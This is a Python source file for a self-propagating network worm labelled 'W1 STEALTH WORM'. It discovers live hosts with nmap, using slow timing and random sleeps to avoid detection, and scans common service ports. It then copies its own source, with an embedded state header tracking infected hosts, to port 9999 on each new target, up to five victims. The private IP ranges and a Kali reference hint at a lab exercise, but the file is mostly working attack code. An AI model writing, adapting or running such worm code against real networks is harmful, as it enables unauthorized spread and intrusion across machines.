import socket
import nmap
import time
import random
import json
from datetime import datetime

SUBNET = "192.168.100.10-20"
COLLECTOR_IP = "192.168.210.10"
COLLECTOR_PORT = 8888
WORM_PORT = 9999
MAX_VICTIMS = 5


def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.210.10", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def random_delay():
    delay = random.uniform(10, 60)
    print(f"[~] Sleeping for {round(delay,2)} seconds")
    time.sleep(delay)


def discover_hosts():
    print("[*] Starting host discovery...")
    nm = nmap.PortScanner()
    random_delay()
    nm.scan(hosts=SUBNET, arguments=f'-sn -T{random.randint(1,2)}')
    live_hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
    random.shuffle(live_hosts)
    print(f"[+] Live hosts discovered: {live_hosts}")
    return live_hosts


def scan_ports(hosts):
    print("[*] Starting port scan...")
    nm = nmap.PortScanner()
    port_data = {}

    for host in hosts:
        print(f"[~] Scanning ports on {host}")
        time.sleep(random.uniform(3, 8))
        nm.scan(hosts=host, arguments=f'-T{random.randint(1,2)} -p 21,22,80,443,3306,8080')

        open_ports = []
        if host in nm.all_hosts():
            for port in [21, 22, 80, 443, 3306, 8080]:
                try:
                    if nm[host]['tcp'][port]['state'] == 'open':
                        open_ports.append(port)
                except:
                    pass

        print(f"[+] {host} open ports: {open_ports if open_ports else 'none'}")
        port_data[host] = open_ports

    return port_data


def spread(target_ip, my_ip, hop_count, infected):
    print(f"[!] Attempting infection: {my_ip} → {target_ip}")

    try:
        with open(__file__, "r") as f:
            lines = f.readlines()

        if lines[0].startswith("# STATE:"):
            lines = lines[1:]

        worm_code = "".join(lines)

        state = json.dumps({
            "source_ip": my_ip,
            "hop_count": hop_count,
            "infected": infected
        })

        final_code = f"# STATE:{state}\n" + worm_code

        random_delay()

        s = socket.socket()
        s.settimeout(5)

        print(f"[~] Connecting to {target_ip}:{WORM_PORT}")
        s.connect((target_ip, WORM_PORT))
        s.sendall(final_code.encode())
        s.close()

        print(f"[+] Payload sent to {target_ip}")
        return True

    except Exception as e:
        print(f"[-] Infection failed: {target_ip} — {e}")
        return False


def main():
    print("================================")
    print("      W1 STEALTH WORM START     ")
    print("================================")

    my_ip = get_my_ip()

    try:
        with open(__file__, "r") as f:
            first_line = f.readline()

        if first_line.startswith("# STATE:"):
            state = json.loads(first_line[8:])
            source_ip = state["source_ip"]
            hop_count = state["hop_count"]
            infected = state["infected"]

            print(f"[+] State loaded — source: {source_ip}, hop: {hop_count}, infected: {infected}")
        else:
            raise ValueError("no state")

    except:
        source_ip = my_ip
        hop_count = 0
        infected = [my_ip]
        print("[+] Fresh start on Kali")

    while len(infected) < MAX_VICTIMS + 1:
        print("\n[*] Beginning propagation cycle")

        random_delay()

        live_hosts = discover_hosts()

        target = None
        for h in live_hosts:
            if h not in infected and h != COLLECTOR_IP:
                target = h
                break

        if not target:
            print("[!] No valid targets found")
            break

        print(f"[+] Target selected: {target}")

        port_data = scan_ports([target])

        success = spread(target, my_ip, hop_count, infected)

        if success:
            infected.append(target)
            print(f"[+] Infection chain updated: {infected}")


main()
